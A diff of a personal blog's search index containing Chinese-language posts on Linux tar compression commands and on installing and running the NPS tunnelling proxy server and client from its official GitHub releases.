+    <title>Linux 压缩命令</title>
+    <url>/2021/12/23/index_5/</url>
+    <content><![CDATA[<h3 id="压缩："><a href="#压缩：" class="headerlink" title="压缩："></a>压缩：</h3><pre><code>tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
+</code></pre>
+<h3 id="解压："><a href="#解压：" class="headerlink" title="解压："></a>解压：</h3><pre><code>tar -zxvf test.tar.gz
+</code></pre>
+<h3 id="分卷压缩"><a href="#分卷压缩" class="headerlink" title="分卷压缩"></a>分卷压缩</h3><p>将文件data.tar.gz 分为 5000m 一个包</p>
+<pre><code>tar -zcvf - data.tar.gz  | split -d -b 5000m - d.tar.gz
+</code></pre>
 
 ]]></content>
   </entry>
   <entry>
     <title>NPS使用</title>
     <url>/2021/12/23/index_6/</url>
-    <content><![CDATA[<h2 id="NPS项目地址：https-github-com-ehang-io-nps"><a href="#NPS项目地址：https-github-com-ehang-io-nps" class="headerlink" title="NPS项目地址：https://github.com/ehang-io/nps"></a>NPS项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></h2><div class="story post-story"><h2 id="服务端操作"><a href="#服务端操作" class="headerlink" title="服务端操作"></a>服务端操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载服务器端包</span><br><span class="line">wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压</span><br><span class="line">tar -zxvf linux_amd64_server.tar.gz</span><br><span class="line"></span><br><span class="line"># 安装</span><br><span class="line">./nps install </span><br><span class="line"></span><br><span class="line"># 服务端启动</span><br><span class="line">sudo nps start </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="NPS项目地址：https-github-com-ehang-io-nps"><a href="#NPS项目地址：https-github-com-ehang-io-nps" class="headerlink" title="NPS项目地址：https://github.com/ehang-io/nps"></a>NPS项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></h2><div class="story post-story"><h2 id="服务端操作"><a href="#服务端操作" class="headerlink" title="服务端操作"></a>服务端操作</h2><pre><code># 下载服务器端包
+wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
 
-<h3 id="修改NPS后台账号密码"><a href="#修改NPS后台账号密码" class="headerlink" title="修改NPS后台账号密码"></a>修改NPS后台账号密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编辑配置文件</span><br><span class="line">vi /etc/nps/conf/nps.conf</span><br><span class="line"></span><br><span class="line">#重启NPS使配置生效</span><br><span class="line">nps restart </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+# 解压
+tar -zxvf linux_amd64_server.tar.gz
 
+# 安装
+./nps install 
 
+# 服务端启动
+sudo nps start 
+</code></pre>
+<h3 id="修改NPS后台账号密码"><a href="#修改NPS后台账号密码" class="headerlink" title="修改NPS后台账号密码"></a>修改NPS后台账号密码</h3><pre><code>#编辑配置文件
+vi /etc/nps/conf/nps.conf
+
+#重启NPS使配置生效
+nps restart 
+</code></pre>
 </div><h2 id="客户端操作"><a href="#客户端操作" class="headerlink" title="客户端操作"></a>客户端操作</h2><div class="story post-story"><p>下载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf linux_amd64_client.tar.gz </span><br></pre></td></tr></table></figure>
-
-
+<pre><code>wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz 
+</code></pre>
+<pre><code>tar -zxvf linux_amd64_client.tar.gz 
+</code></pre>
 <p>运行并挂在后台</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./npc -server=0.0.0.0:8024 -vkey=6bc8ktofi42up0ix &gt; log &amp; </span><br></pre></td></tr></table></figure>
-
+<pre><code>./npc -server=0.0.0.0:8024 -vkey=6bc8ktofi42up0ix &gt; log &amp; 
+</code></pre>
 <h3 id="将NPC注册到系统服务-开机启动、守护进程"><a href="#将NPC注册到系统服务-开机启动、守护进程" class="headerlink" title="将NPC注册到系统服务(开机启动、守护进程)"></a>将NPC注册到系统服务(开机启动、守护进程)</h3><p>运行的时候加上<code>install</code></p>
 <p>对于linux、darwin</p>
 <ul>
@@ -279,23 +311,5 @@
   </div>
 </div>
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-  </entry>
-  <entry>
-    <title>Linux 压缩命令</title>
-    <url>/2021/12/23/index_5/</url>
-    <content><![CDATA[<h3 id="压缩："><a href="#压缩：" class="headerlink" title="压缩："></a>压缩：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="解压："><a href="#解压：" class="headerlink" title="解压："></a>解压：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="分卷压缩"><a href="#分卷压缩" class="headerlink" title="分卷压缩"></a>分卷压缩</h3><p>将文件data.tar.gz 分为 5000m 一个包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf - data.tar.gz  | split -d -b 5000m - d.tar.gz</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
   </entry>
 </search>
